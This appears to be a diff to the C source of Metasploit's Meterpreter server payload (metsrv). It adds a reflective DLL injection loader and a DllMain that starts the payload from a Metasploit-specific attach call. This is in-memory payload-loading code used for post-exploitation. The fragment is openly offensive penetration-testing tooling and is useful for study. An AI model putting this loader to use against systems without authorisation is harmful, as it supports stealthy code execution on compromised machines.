@@ -5,8 +5,19 @@
 
 #define	UnpackAndLinkLibs(p, s)
 
+#define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }
+
+
+#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
+#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
+
 DWORD __declspec(dllexport) Init(MetsrvConfig* metConfig)
 {
+	// if hAppInstance is still == NULL it means that we havent been
+	// reflectivly loaded so we must patch in the hAppInstance value
+	// for use with loading server extensions later.
+	InitAppInstance();
+
 	// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually
 	// a pointer to the metserv configuration, so do a nasty cast and move on.
 	dprintf("[METSRV] Getting ready to init with config %p", metConfig);
@@ -31,6 +42,30 @@ DWORD __declspec(dllexport) Init(MetsrvConfig* metConfig)
 		break;
 	}
 	return result;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
+{
+	BOOL bReturnValue = TRUE;
+
+	switch (dwReason)
+	{
+	case DLL_METASPLOIT_ATTACH:
+		bReturnValue = Init((MetsrvConfig*)lpReserved);
+		break;
+	case DLL_QUERY_HMODULE:
+		if (lpReserved != NULL)
+			*(HMODULE*)lpReserved = hAppInstance;
+		break;
+	case DLL_PROCESS_ATTACH:
+		hAppInstance = hinstDLL;
+		break;
+	case DLL_PROCESS_DETACH:
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+		break;
+	}
+	return bReturnValue;
 }
 
 #define SLEEP_MAX_SEC (MAXDWORD / 1000)
